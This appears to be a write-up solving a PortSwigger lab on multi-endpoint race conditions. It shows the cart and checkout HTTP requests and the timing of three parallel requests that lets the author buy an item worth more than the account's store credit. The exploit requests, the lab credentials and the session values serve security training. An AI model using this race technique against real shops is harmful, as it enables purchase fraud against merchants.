---
title: Multi-endpoint race conditions
description: PortSwigger Race Conditions Lab
---
This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a **Lightweight L33t Leather Jacket**.

You can log into your account with the following credentials: `wiener:peter`.

## Discovery
Add to cart request
```http
POST /cart HTTP/2
Host: 0a77006a041b885f808c49d300a3000e.web-security-academy.net
Cookie: session=nFmuqP0kp5NXX2joW92zrp4uWVDRIKfg
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Origin: https://0a77006a041b885f808c49d300a3000e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a77006a041b885f808c49d300a3000e.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

productId=2&redir=PRODUCT&quantity=1
```

Checkout 
```http
POST /cart/checkout HTTP/2
Host: 0a77006a041b885f808c49d300a3000e.web-security-academy.net
Cookie: session=nFmuqP0kp5NXX2joW92zrp4uWVDRIKfg
Content-Length: 37
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Origin: https://0a77006a041b885f808c49d300a3000e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a77006a041b885f808c49d300a3000e.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=LERFbIVUr3ZiTRJyJrG5tO28O6ifbPS7
```

“Add to cart” is tied to the user session, meaning the server stores cart state per session — this opens up the possibility of race condition collisions.

## Exploit
The exploit involves three parallel requests:
1. Add a valid item to the cart (within credit limit)
2. Add a restricted item (exceeds store credit)
3. Trigger checkout
If timed correctly, the server adds the valid item to the cart and begins processing the checkout. Before the checkout is finalised, a restricted item that exceeds the user's store credit is added to the cart. Because the cart state is mutable during this window, the final purchase includes both items, allowing the user to successfully buy more than their store credit allows.

![](../../../../public/images/PS_Race_Conditions_20250613%20_155828.png)

Request 1:
```http
POST /cart HTTP/2
Host: 0a77006a041b885f808c49d300a3000e.web-security-academy.net

productId=2&redir=PRODUCT&quantity=1
```

Request 2:
```http
POST /cart HTTP/2
Host: 0a77006a041b885f808c49d300a3000e.web-security-academy.net

productId=1&redir=PRODUCT&quantity=1
```

Request 3:
```http
POST /cart/checkout HTTP/2
Host: 0a77006a041b885f808c49d300a3000e.web-security-academy.net
```

It took a couple of tries for the leather jacket to checkout. 
![](../../../../public/images/PS_Race_Conditions_20250613%20_174705.png)